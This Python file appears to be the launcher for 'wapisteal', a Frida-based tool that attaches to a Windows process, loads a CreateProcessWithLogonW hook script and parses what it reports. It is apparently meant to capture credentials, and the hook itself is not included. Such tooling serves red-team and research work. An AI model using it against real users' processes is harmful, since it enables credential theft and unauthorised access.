from __future__ import print_function
import frida
import sys
from parseData import parseData

Stop = False
cmd = ""

def on_message(message, data):
    if "payload" in message:
        parseData(message["payload"])

def main(target_process):
    session = frida.attach(target_process)

    with open("scripts/CreateProcessWithLogonW.js", "r") as file:
        script = session.create_script(file.read())
    script.on('message', on_message)
    script.load()
    print("[!] Ctrl+Z to detach.\n\n")
    sys.stdin.read()
    session.detach()

if __name__ == '__main__':
    print("""
             /|~~~   
           ///|             wapisteal
         /////|                     
       ///////|                             
     /////////|
   \==========|===/  
~~~~~~~~~~~~~~~~~~~~~
""")
    if len(sys.argv) != 2:
        while not Stop:
            cmd = input("wapisteal > ")
            command = cmd.split(" ")[0]
            if command == "set_target":
                try:
                    target_process = int(cmd.split(" ")[1])
                except ValueError:
                    target_process = cmd.split(" ")[1]
                print("[!] Set target to " + str(target_process))
            if command == "attach":
                Stop = True
                main(target_process)
        sys.exit(1)

    try:
        target_process = int(sys.argv[1])
    except ValueError:
        target_process = sys.argv[1]
    main(target_process)